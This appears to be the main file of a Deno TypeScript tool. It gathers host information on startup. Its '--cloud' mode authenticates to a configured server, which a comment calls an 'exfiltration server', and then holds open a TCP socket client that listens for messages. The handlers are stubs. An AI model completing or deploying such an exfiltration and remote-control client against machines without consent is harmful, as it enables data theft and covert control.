import { start } from "./utils/start.ts";
new start();

import { getinfos } from "./utils/getInfos.ts";
import { secure } from "./utils/secure.ts";
let _getinfos = new getinfos();
let _secure = new secure();
let infos = await _getinfos.main();

import { Client, Event, Packet, Server } from "https://deno.land/x/tcp_socket@0.0.2/mods.ts";

let config = JSON.parse(Deno.readTextFileSync('./deploy.json'));

async function main() {
    //get all the args and start the program
    let args = await manageArgs();
    if (args.help) {
        showHelp();
        return
    }


    /**
     * 2 parts: 
     * - rescue mode // enable the emergency rescue mode
     * - cloud mode // enable the cloud mode => http cloud AES encryption client side
     */

    if(args.rescue){
        rescueMode()
    }

    if(args.cloud){
        cloudMode()
    }

}

//program function
async function rescueMode(){
    console.log('~~ Rescue mode enabled')
    await _secure.main(infos);
}
async function cloudMode() {
    console.log('~~ Cloud mode enabled')

    // faire la requette pour une auth au server d'exfiltration 
    let authRequest = await fetch(config.exfiltration.hostname+ ":" +config.exfiltration.port + '/auth', {
        method: 'POST',
        headers: {
            "ir-server": "HIBVUIK"
        },
        body: JSON.stringify({
            name: "test",
            key: "keytest",
            aes: "none"
        })
    })

    // verifier l'auth
    let auth = await authRequest.json()
    //lancer la conv avec le server socket
    generateSocketClient(config.exfiltration.hostnameSocket, config.exfiltration.portSocket, auth.authKey)
}


async function generateSocketClient(hostname, port, authKey){
    console.log('~~ Lancement du client socket')
    const client = new Client({ hostname: hostname, port: port });
    // Connection open
    client.on(Event.connect, (client: Client) => {
        //here auth the client with the request creditentials
        client.write(JSON.stringify({
            url: "/auth",
            value: { authKey: authKey }
        }))
    });
    
    // Receive message
    client.on(Event.receive, (client: Client, data: Packet) => {
        data = data.toString()
        interpretSocketMessages(client, data)
    });
    
    // Connection close
    client.on(Event.close, (client: Client) => {
        console.log("Close");
        //do the auto connect
    });
    
    // Handle error
    client.on(Event.error, (e) => {
        console.error(e);
    });
    await client.connect();
    return new Promise((resolve, reject) => {
        //brain fuck xD
        setInterval(() => {}, 60000)
    })
}

async function interpretSocketMessages(client, msg){
    console.log('new message')
    console.log(msg)
}



//Utils functions
async function manageArgs() {
    return {
        args: Deno.args,
        rescue: Deno.args.includes("--rescue"),
        help: Deno.args.includes("--help"),
        version: Deno.args.includes("--version"),
        cloud: Deno.args.includes("--cloud")
    }
}

async function showHelp() {
    console.log('HELP')
}



/*

let db = JSON.parse(Deno.readTextFileSync('./deploy.json'));
for(let i = 0; i<db.length; i++){
    //console.log('[+] launch deploy of: '+db[i].name);
}

*/


main()
